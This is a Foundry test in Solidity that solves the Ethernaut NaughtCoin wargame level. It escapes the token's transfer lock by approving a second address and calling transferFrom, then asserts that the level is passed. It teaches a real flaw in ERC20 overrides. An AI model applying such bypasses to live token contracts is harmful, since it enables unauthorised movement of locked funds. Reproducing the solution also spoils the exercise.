// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/15-NaughtCoin/NaughtCoinFactory.sol";
import "../src/Ethernaut.sol";

contract NaughtCoinTest is Test {
    Ethernaut ethernaut;
    address player = address(100);
    address friend = address(200);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether);
    }

    function testNaughtCoinHack() public {
        // Level setup
        NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();
        ethernaut.registerLevel(naughtCoinFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(naughtCoinFactory);
        NaughtCoin ethernautNaughtCoin = NaughtCoin(payable(levelAddress));

        // Level attack
        uint256 balance = ethernautNaughtCoin.balanceOf(player);
        ethernautNaughtCoin.approve(friend, balance);
        vm.stopPrank();
        vm.startPrank(friend);
        ethernautNaughtCoin.transferFrom(player, friend, balance);
        vm.stopPrank();

        // Level submission
        vm.startPrank(player);
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}